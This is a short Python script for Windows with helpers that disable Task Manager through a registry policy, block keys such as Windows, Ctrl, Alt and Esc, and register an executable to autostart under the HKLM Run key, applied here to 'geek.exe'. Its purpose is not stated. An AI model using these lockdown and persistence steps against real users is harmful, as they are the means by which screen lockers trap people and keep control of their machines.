import ctypes
import os
import keyboard
def cout(x):
    print(x)


def bantM():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    if is_admin():
        path = 'REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t reg_dword /d "1" /f'
        os.system(path)
        return "succeed"
    else:
        return "fail"


def unbantM():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    if is_admin():
        path = 'REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /f'
        os.system(path)
        return "succeed"
    else:
        return "fail"

def banImportKey():
    key = ["windows", "ctrl", "shift", "tab", "f4", "delete", "alt", "esc", "insert", "home"]
    for i in key:
        keyboard.block_key(i)


def banOneKey(x):
    keyboard.block_key(x)


def banTwoKey(x, y):
    key = [x, y]
    for i in key:
        keyboard.block_key(i)


def banThreeKey(x, y, z):
    key = [x, y, z]
    for i in key:
        keyboard.block_key(i)

def self_starting(x, y):
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if is_admin():
        path = 'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "\"{}" /start" /f'.format(x, y)
        os.system(path)
        return "succeed"
    else:
        return "fail"
a = self_starting("aaa","D:\常用\磁盘\geek.exe")
print(a)